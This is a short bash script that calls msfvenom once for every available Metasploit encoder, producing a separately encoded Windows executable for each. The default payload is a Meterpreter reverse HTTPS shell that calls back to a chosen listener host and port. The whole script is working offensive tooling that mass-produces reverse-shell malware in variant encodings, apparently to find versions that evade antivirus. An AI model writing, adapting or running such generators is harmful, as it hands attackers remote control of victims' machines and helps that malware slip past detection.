#!/bin/bash
if [ -z $1 ];then printf '\nSyntax: $0 <folder|/tmp/exes> <arch|x86> <platform|windows> "<payload|windows/meterpreter/reverse_https>" <lhost|127.0.0.1> <lport|443> <format|exe>\n\n'
        else
FOLDER=$1; ARCH=$2; PLATFORM=$3; PAYLOAD=$4; LHOST=$5; LPORT=$6; FORMAT=$7;
mkdir -p $FOLDER >/dev/null 2>&1;
for ENCODER in $(msfvenom -l encoders|grep '\/'|awk '{print $1}'); do
        msfvenom -a $ARCH --platform $PLATFORM -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -e "$ENCODER" -o "$FOLDER/$(echo $ENCODER|tr '/' '_').exe" -i 3 -f $FORMAT;
done
fi

